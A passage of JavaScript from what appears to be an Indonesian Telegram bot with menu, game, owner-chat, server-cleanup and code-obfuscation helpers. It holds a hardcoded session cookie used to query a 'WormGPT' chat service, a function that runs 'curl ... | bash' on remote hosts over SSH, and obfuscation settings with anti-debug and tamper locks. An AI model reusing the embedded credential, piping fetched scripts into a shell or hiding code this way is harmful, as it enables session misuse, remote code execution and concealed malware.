    const colors = [chalk.hex('#FF5252').bold, chalk.hex('#FF9800').bold, chalk.hex('#FFEB3B').bold,
        chalk.hex('#4CAF50').bold, chalk.hex('#00BCD4').bold, chalk.hex('#2196F3').bold,
        chalk.hex('#3F51B5').bold, chalk.hex('#9C27B0').bold, chalk.hex('#E91E63').bold, chalk.hex('#FFFFFF').bold];
    let result = '';
    for (let i = 0; i < text.length; i++) result += colors[i % colors.length](text[i]);
    console.log(result);
}

function getDisabledCommands() {
    return [];
}

async function toWebp(buffer, format, packName, authorName) {
    return { data: buffer, delete: () => { } };
}

async function getFileLink(fileId, tokens) {
    const res = await axios.get(`https://api.telegram.org/bot${tokens}/getFile?file_id=${fileId}`);
    if (!res.data.ok) throw new Error('Gagal ambil file path');
    return `https://api.telegram.org/file/bot${tokens}/${res.data.result.file_path}`;
}

async function sendLoading(ctx, message = '⏳ Tunggu sebentar...') {
    return await ctx.reply(`<blockquote>${message}</blockquote>`, { parse_mode: 'HTML' });
}

async function editMenuMessage(ctx, text, keyboard) {
  try {
    await ctx.editMessageText(text, {
      parse_mode: "HTML",
      ...keyboard
    });
  } catch (e) {
    try {
      const newMsg = await safeReply(ctx, text, {
        parse_mode: "HTML",
        ...keyboard
      });
      
      try {
        if (ctx.callbackQuery) {
          await ctx.deleteMessage();
        }
      } catch (err) {}
      
      return newMsg;
    } catch (replyErr) {
      console.error("Edit menu error:", replyErr);
      return null;
    }
  }
}

async function editMenuMessageWithPhoto(ctx, menuimage, caption, keyboard) {
  try {
    await ctx.editMessageMedia({
      type: 'photo',
      media: menuimage,
      caption: caption,
      parse_mode: 'HTML'
    }, {
      parse_mode: "HTML",
      ...keyboard
    });
  } catch (e) {
    try {
      try {
        if (ctx.callbackQuery) {
          await ctx.deleteMessage();
        }
      } catch (err) {}
      
      await ctx.replyWithPhoto(menuimage, {
        caption: caption,
        parse_mode: "HTML",
        ...keyboard
      });
    } catch (replyErr) {
      console.error("Edit menu with photo error:", replyErr);
      return null;
    }
  }
}

async function editLoading(loadingMsg, newText) {
    try {
        await loadingMsg.editText(`<blockquote>${newText}</blockquote>`, { parse_mode: 'HTML' });
    } catch (err) {
        console.error(chalk.yellow(`⚠️ Gagal mengedit loading message: ${err.message}`));
    }
}

async function safeReply(ctx, text, extra = {}) {
  try {
    return await ctx.reply(text, extra);
  } catch (err) {
    const m = err?.response?.description || err?.description || err?.message || String(err);
    if (typeof m === 'string' && (m.toLowerCase().includes('user is deactivated') || m.toLowerCase().includes('bot was blocked') || m.toLowerCase().includes('blocked'))) {
      return null;
    }
    throw err;
  }
}

const currentDir = __dirname;
const validateFile = (ctx, allowedExtensions = ['.js']) => {
    if (!ctx.message.reply_to_message?.document) {
        ctx.reply(`❌ Syntax Error!\n\nUse : Reply file ${allowedExtensions.join('/')} dengan command ${ctx.command}`);
        return null;
    }

    const doc = ctx.message.reply_to_message.document;
    const hasValidExtension = allowedExtensions.some(ext => doc.file_name.endsWith(ext));
        
    if (!hasValidExtension) {
        ctx.reply(`❌ Hanya file ${allowedExtensions.join('/')} yang didukung!`);
        return null;
    }

   return doc;
};

const createTempFile = (content, prefix, extension) => {
    const tempDir = path.join(currentDir, 'tmp');
    if (!fs.existsSync(tempDir)) {
        fs.mkdirSync(tempDir, { recursive: true });
    }

    const fileName = `${prefix}-${Date.now()}${extension}`;
    const filePath = path.join(tempDir, fileName);
    fs.writeFileSync(filePath, content);
    return { filePath, fileName };
};

const cleanupTempFile = (filePath) => {
     if (fs.existsSync(filePath)) {
        try {
            fs.unlinkSync(filePath);
             console.log(chalk.blue(`🗑️ File dihapus: ${filePath}`));
        } catch (err) {
            console.error(chalk.red(`❌ Gagal menghapus file: ${err.message}`));
        }
    }
};

async function wormgptChat(query) {
    const messageId = `${rand(8)}-${rand(4)}-${rand(4)}-${rand(4)}-${rand(12)}`;
    const userId = `${rand(8)}-${rand(4)}-${rand(4)}-${rand(4)}-${rand(12)}`;
    const cookie = '__Secure-authjs.session-token=eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2Q0JDLUhTNTEyIiwia2lkIjoiRnlESjQ1UXFQeDVRSVhoaVNSQk5uNFBHcFBFVnQzbjBZTVhRVGlEZ3hNeS1KaEZCNTJQOWx6d0lvNTRIODU1X3JNVzhWTHE0UUVDUExTWF9aLTh2aXcifQ..BC1-RXYYZM0oVmP7FaXUsw.f5LshHBNgG24G0uaj9te9vcDqm7zynNtVRvuuFjiHJzChQHQ4TYDCG35JXFCtiy29JcTWULM3ynjMp9l3ygwnv4FVIo9BIZBcyUQBzFyPNYcF6FGQEYke-D5ebIXcQi_tXLbxkhLTh9jTJJ4qfqZC13CgeaG-8je-x_dLT7yDe7A0s9QYqk7edr0YT_AmngvgS3MvcvhNmVC35aDurZO3dV2egpNvwgjlJaCn3aNRoiXjmtZow8pX3BUig8pfdE1.TiCtK3B8lnk4_K7R9ZxQvjqd3SVeoBzEUr8V9BKjGN0; __Secure-authjs.callback-url=https%3A%2F%2Fchat.wrmgpt.com%2Flogin';
    const res = await fetch('https://chat.wrmgpt.com/api/chat', {
        method: 'POST',
        headers: {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36',
            'Content-Type': 'application/json',
            Accept: '*/*',
            Origin: 'https://chat.wrmgpt.com',
            Referer: 'https://chat.wrmgpt.com/',
            Cookie: cookie,
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-mobile': '?1',
        },
        body: JSON.stringify({
            id: messageId,
            message: { role: 'user', parts: [{ type: 'text', text: query }], id: userId },
            selectedChatModel: 'wormgpt-v5.5',
            selectedVisibilityType: 'private',
            searchEnabled: false,
            memoryLength: 8,
        }),
    });
    if (!res.ok) throw new Error(`API Error: ${res.status} ${res.statusText}`);
    const raw = await res.text();
    let result = '';
    for (const line of raw.split('\n')) {
        if (!line.startsWith('data: ')) continue;
        const data = line.slice(6).trim();
        if (data === '[DONE]') break;
        try {
            const json = JSON.parse(data);
            if (json.type === 'text-delta' && json.delta) result += json.delta;
        } catch { }
    }
    if (!result) throw new Error('No output content generated');
    return result;
}

async function startGame(ctx, type, apiUrl, formatQuestion) {
    const userId = ctx.from.id;
    if (activeGames.has(userId))
        return ctx.reply("<blockquote>⚠️ Kamu masih punya sesi game aktif! Ketik /stop dulu.</blockquote>", { parse_mode: 'HTML' });
    await ctx.reply("<blockquote>🎮 Mengambil soal, tunggu sebentar...</blockquote>", { parse_mode: 'HTML' });
    try {
        const res = await axios.get(apiUrl);
        const json = res.data;
        const data = json.result || json.data || json;
        if (!data) return ctx.reply("<blockquote>⚠️ Api tidak mengirim data.</blockquote>", { parse_mode: 'HTML' });
        const answer = extractAnswer(data);
        if (!answer) return ctx.reply("<blockquote>⚠️ Jawaban tidak ditemukan.</blockquote>", { parse_mode: 'HTML' });
        const sentMsg = await formatQuestion(ctx, data);
        const timeout = setTimeout(() => {
            activeGames.delete(userId);
            ctx.reply("<blockquote>⏰ Waktu habis! Sesi dihapus.</blockquote>", { parse_mode: 'HTML' });
        }, 4 * 60 * 1000);
        activeGames.set(userId, {
            type,
            questionId: sentMsg.message_id,
            answer: answer.toString().trim().toLowerCase(),
            timeout,
            desc: data.deskripsi || data.clue || ""
        });
    } catch (e) {
        console.error(e);
        ctx.reply("<blockquote>⚠️ Gagal mengambil soal.</blockquote>", { parse_mode: 'HTML' });
    }
}

async function checkUserLimit(ctx, commandName) {
    const userId = ctx.from.id.toString();
    if (isOwner(userId)) return true;
    const limitResult = useLimit(userId, commandName);
    if (!limitResult.success) {
        await ctx.reply(`<blockquote>${limitResult.message}</blockquote>`, { parse_mode: 'HTML' });
        return false;
    }
    return true;
}

async function sendMessageToOwner(ctx, type, content) {
    const userId = ctx.from.id;
    const userName = ctx.from.first_name || ctx.from.username || 'User';
    const username = ctx.from.username ? `@${ctx.from.username}` : 'Gakada';
    const userInfo = `Nama: ${userName}\nUsername: ${username}`;
    
    try {
        const ownerId = OWNER_ID;
        if (!ownerId) {
            console.error('Owner ID tidak ditemukan');
            await ctx.reply('❌ Konfigurasi bot tidak lengkap.');
            Livechat.delete(userId);
            return;
        }

        let sentMessage;
        const messageToOwner = `📨 *Pesan dari User*\n\n${userInfo}\n\n*Pesan:*\n`;
        
        if (type === 'text') {
            const fullMessage = messageToOwner + content;
            sentMessage = await bot.telegram.sendMessage(ownerId, fullMessage, { 
                parse_mode: 'Markdown',
                disable_web_page_preview: true 
            });
        } else {
            const caption = messageToOwner + content;
            const media = ctx.message;
            
            if (media.photo) {
                const photo = media.photo[media.photo.length - 1];
                sentMessage = await bot.telegram.sendPhoto(ownerId, photo.file_id, { 
                    caption, 
                    parse_mode: 'Markdown' 
                });
            } else if (media.video) {
                sentMessage = await bot.telegram.sendVideo(ownerId, media.video.file_id, { 
                    caption, 
                    parse_mode: 'Markdown' 
                });
            } else if (media.document) {
                sentMessage = await bot.telegram.sendDocument(ownerId, media.document.file_id, { 
                    caption, 
                    parse_mode: 'Markdown' 
                });
            }
        }
        
        if (sentMessage) {
            ForMessenger.set(sentMessage.message_id, {
                from: userId,
                original_msg: ctx.message.message_id,
                chat_id: ctx.chat.id,
                user_name: userName,
                timestamp: Date.now()
            });
            await ctx.reply('✅ Pesan Anda telah terkirim ke Owner. Tunggu balasan ya!');
        }
    } catch (error) {
        console.error('Error sending message to owner:', error);
        if (error.code === 400) {
            if (error.description?.includes('chat_id')) {
                await ctx.reply('❌ Gagal mengirim pesan: ID Owner tidak valid.');
            } else if (error.description?.includes('parse')) {
                try {
                    const ownerId = OWNER_ID;
                    const plainMessage = `📨 Pesan dari User\n\n${userInfo}\n\nPesan:\n${content}`;
                    const sentMessage = await bot.telegram.sendMessage(ownerId, plainMessage);
                    
                    ForMessenger.set(sentMessage.message_id, {
                        from: userId,
                        original_msg: ctx.message.message_id,
                        chat_id: ctx.chat.id,
                        user_name: userName,
                        timestamp: Date.now()
                    });
                    
                    await ctx.reply('✅ Pesan Anda telah terkirim ke Owner. Tunggu balasan ya!');
                    return;
                } catch (secondError) {
                    await ctx.reply('❌ Gagal mengirim pesan: Format pesan tidak valid.');
                }
            } else {
                await ctx.reply('❌ Gagal mengirim pesan: Format pesan tidak valid.');
            }
        } else if (error.code === 403) {
            await ctx.reply('❌ Gagal mengirim pesan: Bot diblokir oleh Owner.');
        } else if (error.code === 429) {
            await ctx.reply('❌ Terlalu banyak permintaan. Silakan coba lagi nanti.');
        } else {
            await ctx.reply('❌ Gagal mengirim pesan. Silakan coba lagi nanti.');
        }
        Livechat.delete(userId);
    }
}

async function handleOwnerReply(ctx) {
    const ownerId = ctx.from.id;
    const replyToMsg = ctx.message.reply_to_message;
    
    if (!isOwner(ownerId.toString())) return;
    if (!replyToMsg || !ForMessenger.has(replyToMsg.message_id)) return;
    
    const userData = ForMessenger.get(replyToMsg.message_id);
    const userMessage = ctx.message;
    
    try {
        let replyText = `📢 *Balasan dari Owner:*\n\n`;
        
        if (userMessage.text) {
            replyText += userMessage.text;
            await bot.telegram.sendMessage(userData.from, replyText, { 
                parse_mode: 'Markdown',
                disable_web_page_preview: true 
            });
        } else if (userMessage.photo) {
            const photo = userMessage.photo[userMessage.photo.length - 1];
            const caption = replyText + (userMessage.caption || '');
            await bot.telegram.sendPhoto(userData.from, photo.file_id, { 
                caption, 
                parse_mode: 'Markdown' 
            });
        } else if (userMessage.video) {
            const caption = replyText + (userMessage.caption || '');
            await bot.telegram.sendVideo(userData.from, userMessage.video.file_id, { 
                caption, 
                parse_mode: 'Markdown' 
            });
        } else if (userMessage.document) {
            const caption = replyText + (userMessage.caption || '');
            await bot.telegram.sendDocument(userData.from, userMessage.document.file_id, { 
                caption, 
                parse_mode: 'Markdown' 
            });
        } else if (userMessage.voice) {
            const caption = replyText + (userMessage.caption || '');
            await bot.telegram.sendVoice(userData.from, userMessage.voice.file_id, { 
                caption, 
                parse_mode: 'Markdown' 
            });
        } else if (userMessage.audio) {
            const caption = replyText + (userMessage.caption || '');
            await bot.telegram.sendAudio(userData.from, userMessage.audio.file_id, { 
                caption, 
                parse_mode: 'Markdown' 
            });
        } else if (userMessage.sticker) {
            await bot.telegram.sendSticker(userData.from, userMessage.sticker.file_id);
            await bot.telegram.sendMessage(userData.from, replyText + 'Stiker', { 
                parse_mode: 'Markdown' 
            });
        } else {
            await ctx.reply('❌ Tipe pesan tidak didukung untuk dibalas.');
            return;
        }
        
        await ctx.reply('✅ Balasan telah dikirim ke user.');
        
    } catch (error) {
        console.error('Error sending reply to user:', error);
        if (error.code === 403) {
            await ctx.reply('❌ Gagal mengirim balasan. User mungkin sudah memblokir bot.');
        } else if (error.code === 400 && error.description?.includes('parse')) {
            try {
                const plainText = `Balasan dari Owner:\n\n${userMessage.text || 'Pesan'}`;
                await bot.telegram.sendMessage(userData.from, plainText);
                await ctx.reply('✅ Balasan telah dikirim ke user');
            } catch (secondError) {
                await ctx.reply('❌ Gagal mengirim balasan.');
            }
        } else {
            await ctx.reply('❌ Gagal mengirim balasan. Error: ' + error.message);
        }
    }
}

async function getUserInfo(userId) {
    try {
        const user = await bot.telegram.getChat(userId);
        return { id: user.id, username: user.username || 'No Username', first_name: user.first_name || 'No Name', last_name: user.last_name || '' };
    } catch (error) {
        return { id: userId, username: 'Unknown', first_name: 'User', last_name: '' };
    }
}

async function doApiRequest(apiKey, endpoint, method = 'GET', data = null) {
    try {
        const config = { method, url: `https://api.digitalocean.com/v2${endpoint}`, headers: { 'Authorization': `Bearer ${apiKey}`, 'Content-Type': 'application/json' } };
        if (data && (method === 'POST' || method === 'PUT')) config.data = data;
        const response = await axios(config);
        return { success: true, data: response.data };
    } catch (error) {
        console.error('DO API Error:', error.response?.data || error.message);
        return { success: false, error: error.response?.data?.message || error.message };
    }
}

function installSingleScript(conn, scriptUrl, scriptNumber) {
    return new Promise((resolve) => {
        const startTime = Date.now();
        conn.exec(`curl -fsSL "${scriptUrl}" | bash -s`, (err, stream) => {
            if (err) {
                const duration = (Date.now() - startTime) / 1000;
                resolve({ scriptNumber, success: false, error: err.message, duration: duration.toFixed(2) });
                return;
            }
            let output = '', errorOutput = '';
            stream.on('data', (data) => {
                output += data.toString();
                if (output.length > 2000) output = output.slice(-2000);
            });
            stream.stderr.on('data', (data) => {
                errorOutput += `[ERROR] ${data.toString()}`;
                if (errorOutput.length > 500) errorOutput = errorOutput.slice(-500);
            });
            stream.on('close', (code) => {
                const duration = (Date.now() - startTime) / 1000;
                resolve({
                    scriptNumber,
                    success: code === 0,
                    error: code !== 0 ? `Exit code: ${code}\n${errorOutput}` : '',
                    output: output + (errorOutput ? '\n\nERROR:\n' + errorOutput : ''),
                    duration: duration.toFixed(2)
                });
            });
        });
    });
}

async function animateLoading(ctx, textList, delay = 500) {
    let index = 0;
    const sent = await ctx.reply(textList[0], { parse_mode: "Markdown" });
    const interval = setInterval(async () => {
        index = (index + 1) % textList.length;
        try {
            await ctx.telegram.editMessageText(ctx.chat.id, sent.message_id, null, textList[index], { parse_mode: "Markdown" });
        } catch (e) { }
    }, delay);
    return { interval, message_id: sent.message_id };
}

function getServerConfig(server) {
    const configs = {
        "V1": { domain, apikey, capikey, nestid, egg, loc },
        "V2": { domain: domainV2, apikey: apikeyV2, capikey: capikeyV2, nestid: nestidV2, egg: eggV2, loc: locV2 },
        "V3": { domain: domainV3, apikey: apikeyV3, capikey: capikeyV3, nestid: nestidV3, egg: eggV3, loc: locV3 },
        "V4": { domain: domainV4, apikey: apikeyV4, capikey: capikeyV4, nestid: nestidV4, egg: eggV4, loc: locV4 },
        "V5": { domain: domainV5, apikey: apikeyV5, capikey: capikeyV5, nestid: nestidV5, egg: eggV5, loc: locV5 }
    };
    return configs[server] || configs["V1"];
}

// -------------------- [ Helper Function: Safe Timeout ] -------------------- \\
async function safeFetch(url, options, timeout = 30000) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeout);

    try {
        const response = await fetch(url, {
            ...options,
            signal: controller.signal
        });
        clearTimeout(id);
        return response;
    } catch (error) {
        clearTimeout(id);
        throw error;
    }
}

// -------------------- [ Delete server offline ] -------------------- \\
async function dellserveroff(ctx, server) {
    const config = getServerConfig(server);
    const { domain: serverDomain, apikey: serverApikey, capikey: serverCapikey } = config;

    if (!serverCapikey) {
        await ctx.reply(`❌ API Key Client tidak tersedia untuk server ${server}.`);
        return { success: 0, failed: 0, total: 0 };
    }

    try {
        const { offlineServers, totalServers } = await getserver(serverDomain, serverApikey, serverCapikey);
        
        if (!offlineServers || offlineServers.length === 0) {
            return { success: 0, failed: 0, total: 0 };
        }

        let success = 0;
        let failed = 0;

        for (const srv of offlineServers) {
            try {
                const delRes = await safeFetch(`${serverDomain}/api/application/servers/${srv.id}`, {
                    method: "DELETE",
                    headers: getHeaders(serverApikey),
                }, 30000);

                if (delRes.status === 204 || delRes.ok) {
                    success++;
                } else {
                    failed++;
                }
            } catch (err) {
                console.error(`Error deleting server ${srv.id}:`, err.message);
                failed++;
            }
            await sleep(800); // Delay untuk menghindari rate limit
        }

        return { 
            success, 
            failed, 
            total: offlineServers.length 
        };

    } catch (err) {
        console.error(`Error in dellserveroff ${server}:`, err);
        throw err;
    }
}

// -------------------- [ clear server and user ] -------------------- \\
async function clearserveranduser(ctx, server) {
    const config = getServerConfig(server);
    const { domain: serverDomain, apikey: serverApikey, capikey: serverCapikey } = config;

    if (!serverCapikey) {
        await ctx.reply(`❌ API Key tidak tersedia untuk server ${server}.`, { parse_mode: 'HTML' });
        return;
    }

    let processMsg = null;
    
    try {
        processMsg = await ctx.reply(`<blockquote>⏳ <b>MEMULAI CLEAR SERVER OFFLINE ${server}</b></blockquote>`, { parse_mode: 'HTML' });

        const offlineServers = await getserver(serverDomain, serverApikey, serverCapikey);
        
        let serverSuccess = 0;
        let serverFailed = 0;
        
        if (offlineServers.offlineServers && offlineServers.offlineServers.length > 0) {
            await ctx.telegram.editMessageText(
                ctx.chat.id,
                processMsg.message_id,
                null,
                `<blockquote>⏳ <b>Menghapus server offline...</b></blockquote>`,
                { parse_mode: 'HTML' }
            );

            for (const srv of offlineServers.offlineServers) {
                try {
                    const delRes = await safeFetch(`${serverDomain}/api/application/servers/${srv.id}`, {
                        method: "DELETE",
                        headers: getHeaders(serverApikey),
                    }, 30000);

                    if (delRes.status === 204 || delRes.ok) {
                        serverSuccess++;
                    } else {
                        serverFailed++;
                    }
                } catch (err) {
                    serverFailed++;
                }
                await sleep(800);
            }
        }

        await ctx.telegram.editMessageText(
            ctx.chat.id,
            processMsg.message_id,
            null,
            `<blockquote>⏳ <b>CLEAR OFFLINE ${server}</b>\n✅ <b>Delete Server Selesai:</b>\n• Berhasil: ${serverSuccess}\n• Gagal: ${serverFailed}\n\n⏱️ Menunggu 5 detik sebelum lanjut...</blockquote>`,
            { parse_mode: 'HTML' }
        );

        await sleep(5000); // Tunggu 5 detik
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            processMsg.message_id,
            null,
            `<blockquote>⏳ <b>MEMULAI CLEAR USER OFFLINE ${server}</b></blockquote>`,
            { parse_mode: 'HTML' }
        );

        const offlineUsers = await getalluser(serverDomain, serverApikey);
        
        let userSuccess = 0;
        let userFailed = 0;

        if (offlineUsers.offlineUsers && offlineUsers.offlineUsers.length > 0) {
            await ctx.telegram.editMessageText(
                ctx.chat.id,
                processMsg.message_id,
                null,
                `<blockquote>⏳ <b>Menghapus user tanpa server...</b></blockquote>`,
                { parse_mode: 'HTML' }
            );

            for (const user of offlineUsers.offlineUsers) {
                try {
                    const hasServer = await cekuserandserver(serverDomain, serverApikey, user.id);
                    if (!hasServer) {
                        const delRes = await safeFetch(`${serverDomain}/api/application/users/${user.id}`, {
                            method: "DELETE",
                            headers: getHeaders(serverApikey),
                        }, 25000);

                        if (delRes.status === 204 || delRes.ok) {
                            userSuccess++;
                        } else {
                            userFailed++;
                        }
                    } else {
                        userFailed++;
                    }
                } catch (err) {
                    userFailed++;
                }
                await sleep(1200);
            }
        }

        await ctx.telegram.deleteMessage(ctx.chat.id, processMsg.message_id).catch(() => {});
        const resultMessage = `
<blockquote><b>✅ CLEAR OFFLINE ${server} SELESAI</b>

🖥️ <b>SERVER OFFLINE:</b>
│• Total Ditemukan: ${offlineServers.offlineServers?.length || 0}
│• ✅ Berhasil Dihapus: ${serverSuccess}
│• ❌ Gagal Dihapus: ${serverFailed}

👥 <b>USER TANPA SERVER:</b>
│• Total Ditemukan: ${offlineUsers.offlineUsers?.length || 0}
│• ✅ Berhasil Dihapus: ${userSuccess}
│• ❌ Gagal Dihapus: ${userFailed}

📊 <b>RINGKASAN:</b>
│• Total Diproses: ${(offlineServers.offlineServers?.length || 0) + (offlineUsers.offlineUsers?.length || 0)}
│• Total Berhasil: ${serverSuccess + userSuccess}
│• Total Gagal: ${serverFailed + userFailed}

© AldzyIsHere</blockquote>`;

        await ctx.reply(resultMessage, { parse_mode: 'HTML' });

    } catch (err) {
        console.error(`FATAL ERROR CLEAR SVR OFF ${server}:`, err);
        if (processMsg) {
            await ctx.telegram.deleteMessage(ctx.chat.id, processMsg.message_id).catch(() => {});
        }
        
        await ctx.reply(`❌ <b>CRITICAL ERROR:</b>\n<code>${err.message}</code>\n\nSilakan coba lagi nanti.`, { parse_mode: 'HTML' });
    }
}



// ========== FUNGSI OBFUSCATION QUANTUM ==========
const obfuscateQuantum = async (fileContent) => {
    const generateTimeBasedIdentifier = () => {
        const timeStamp = new Date().getTime().toString().slice(-5);
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_$#@&*";
        let identifier = "qV_";
        for (let i = 0; i < 7; i++) {
            identifier += chars[Math.floor((parseInt(timeStamp[i % 5]) + i * 2) % chars.length)];
        }
        return identifier;
    };

    const currentMilliseconds = new Date().getMilliseconds();
    const phantomCode = currentMilliseconds % 3 === 0 ? `if(Math.random()>0.999)console.log('PhantomTrigger');` : "";

    try {
        const obfuscated = await JsConfuser.obfuscate(fileContent + phantomCode, {
            target: "node",
            compact: true,
            renameVariables: true,
            renameGlobals: true,
            identifierGenerator: generateTimeBasedIdentifier,
            stringCompression: true,
            stringConcealing: false,
            stringEncoding: true,
            controlFlowFlattening: 0.85,
            flatten: true,
            shuffle: true,
            rgf: true,
            opaquePredicates: { count: 8, complexity: 5 },
            dispatcher: true,
            globalConcealing: true,
            lock: {
                selfDefending: true,
                antiDebug: (code) => `if(typeof debugger!=='undefined'||(typeof process!=='undefined'&&process.env.NODE_ENV==='debug'))throw new Error('Debugging disabled');${code}`,
                integrity: true,
                tamperProtection: (code) => `if(!((function(){return eval('1+1')===2;})()))throw new Error('Tamper detected');${code}`
            },
            duplicateLiteralsRemoval: true
        });
        
        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }
        
        const key = currentMilliseconds % 256;
        obfuscatedCode = `(function(){let k=${key};return function(c){return c.split('').map((x,i)=>String.fromCharCode(x.charCodeAt(0)^(k+(i%16)))).join('');}('${obfuscatedCode}');})()`;
        return obfuscatedCode;
    } catch (error) {
        throw new Error(`Gagal obfuscate: ${error.message}`);
    }
};

// ========== FUNGSI TIME LOCKED ==========
const obfuscateTimeLocked = async (fileContent, days) => {
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + parseInt(days));
    const expiryTimestamp = expiryDate.getTime();
    
    try {
        const obfuscated = await JsConfuser.obfuscate(
            `(function(){const expiry=${expiryTimestamp};if(new Date().getTime()>expiry){throw new Error('Script has expired after ${days} days');}${fileContent}})();`,
            {
                target: "node",
                compact: true,
                renameVariables: true,
                renameGlobals: true,
                identifierGenerator: "randomized",
                stringCompression: true,
                stringConcealing: true,
                stringEncoding: true,
                controlFlowFlattening: 0.75,
                flatten: true,
                shuffle: true,
                rgf: false,
                opaquePredicates: { count: 6, complexity: 4 },
                dispatcher: true,
                globalConcealing: true,
                lock: {
                    selfDefending: true,
                    antiDebug: (code) => `if(typeof debugger!=='undefined'||process.env.NODE_ENV==='debug')throw new Error('Debugging disabled');${code}`,
                    integrity: true,
                    tamperProtection: (code) => `if(!((function(){return eval('1+1')===2;})()))throw new Error('Tamper detected');${code}`
                },
                duplicateLiteralsRemoval: true
            }
        );
        
        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }
        return obfuscatedCode;
    } catch (error) {
        throw new Error(`Gagal obfuscate: ${error.message}`);
    }
};

// ========== FUNGSI CONFIG OBFUSCATION ==========
function getObfuscationConfig(level = "high") {
    const config = {
        target: "node",
        compact: true,
        hexadecimalNumbers: true,
        controlFlowFlattening: level === "high" ? 0.95 : level === "medium" ? 0.75 : 0.5,
        deadCode: level === "high" ? 0.3 : level === "medium" ? 0.2 : 0.1,
        dispatcher: true,
        duplicateLiteralsRemoval: 0.75,
        flatten: true,
        globalConcealing: true,
        identifierGenerator: "zeroWidth",
        minify: true,
        movedDeclarations: true,
        objectExtraction: true,
        opaquePredicates: level === "high" ? 0.95 : level === "medium" ? 0.75 : 0.5,
        renameVariables: true,
        renameGlobals: true,
        stringConcealing: true,
        stringCompression: true,
        stringEncoding: true,
        stringSplitting: level === "high" ? 0.95 : level === "medium" ? 0.75 : 0.5,
        rgf: false,
    };
    
    if (level === "high") {
        config.lock = {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        };
    }
    
    return config;
}

function getStrongObfuscationConfig() {
    return {
        target: "node",
        calculator: true,
        compact: true,
        hexadecimalNumbers: true,
        controlFlowFlattening: 0.75,
        deadCode: 0.2,
        dispatcher: true,
        duplicateLiteralsRemoval: 0.75,
        flatten: true,
        globalConcealing: true,
        identifierGenerator: "zeroWidth",
        minify: true,
        movedDeclarations: true,
        objectExtraction: true,
        opaquePredicates: 0.75,
        renameVariables: true,
        renameGlobals: true,
        stringConcealing: true,
        stringCompression: true,
        stringEncoding: true,
        stringSplitting: 0.75,
        rgf: false,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
}

function getInvisObfuscationConfig() {
    const generateInvisName = () => {
        const length = Math.floor(Math.random() * 4) + 3;
        let name = "";
        for (let i = 0; i < length; i++) {
            name += "_";
        }
        return name + Math.random().toString(36).substring(2, 5);
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: generateInvisName,
        stringEncoding: true,
        stringSplitting: 0.95,
        controlFlowFlattening: 0.95,
        shuffle: true,
        duplicateLiteralsRemoval: 0.75,
        deadCode: 0.3,
        calculator: true,
        opaquePredicates: 0.75,
        dispatcher: true,
        globalConcealing: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
}

function getStealthObfuscationConfig() {
    const generateStealthName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const length = Math.floor(Math.random() * 3) + 1;
        let name = "";
        for (let i = 0; i < length; i++) {
            name += chars[Math.floor(Math.random() * chars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: generateStealthName,
        stringEncoding: true,
        stringSplitting: 0.75,
        controlFlowFlattening: 0.75,
        shuffle: true,
        duplicateLiteralsRemoval: 0.75,
        deadCode: 0.2,
        opaquePredicates: 0.75,
        dispatcher: true,
        globalConcealing: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
}

function getCustomObfuscationConfig(customName) {
    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => customName + Math.random().toString(36).substring(2, 6),
        stringEncoding: true,
        stringSplitting: 0.75,
        controlFlowFlattening: 0.75,
        shuffle: true,
        duplicateLiteralsRemoval: 0.75,
        deadCode: 0.2,
        opaquePredicates: 0.75,
        dispatcher: true,
        globalConcealing: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
}

function getMandarinObfuscationConfig() {
    const mandarinChars = [
        "龙", "虎", "风", "云", "山", "河", "天", "地", "雷", "电",
        "火", "水", "木", "金", "土", "星", "月", "日", "光", "影",
        "峰", "泉", "林", "海", "雪", "霜", "雾", "冰", "焰", "石"
    ];

    const generateMandarinName = () => {
        const length = Math.floor(Math.random() * 4) + 3;
        let name = "";
        for (let i = 0; i < length; i++) {
            name += mandarinChars[Math.floor(Math.random() * mandarinChars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: generateMandarinName,
        stringEncoding: true,
        stringSplitting: 0.95,
        controlFlowFlattening: 0.95,
        shuffle: true,
        duplicateLiteralsRemoval: 0.75,
        deadCode: 0.3,
        calculator: true,
        opaquePredicates: 0.95,
        dispatcher: true,
        globalConcealing: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
}

function getArabObfuscationConfig() {
    const arabicChars = [
        "أ", "ب", "ت", "ث", "ج", "ح", "خ", "د", "ذ", "ر",
        "ز", "س", "ش", "ص", "ض", "ط", "ظ", "ع", "غ", "ف",
        "ق", "ك", "ل", "م", "ن", "ه", "و", "ي"
    ];

    const generateArabicName = () => {
        const length = Math.floor(Math.random() * 4) + 3;
        let name = "";
        for (let i = 0; i < length; i++) {
            name += arabicChars[Math.floor(Math.random() * arabicChars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: generateArabicName,
        stringEncoding: true,
